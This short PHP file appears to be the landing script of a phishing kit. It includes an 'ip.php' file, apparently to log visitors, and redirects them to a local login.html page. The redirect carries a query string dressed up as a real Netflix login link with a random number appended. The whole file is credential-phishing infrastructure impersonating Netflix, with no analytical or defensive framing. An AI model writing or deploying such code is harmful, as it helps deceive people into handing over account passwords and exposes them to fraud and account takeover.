<?php
include 'ip.php';
$rand = rand(100,1000);
header("Location: login.html?link=https://www.netflix.com/login?s=".$rand);
?>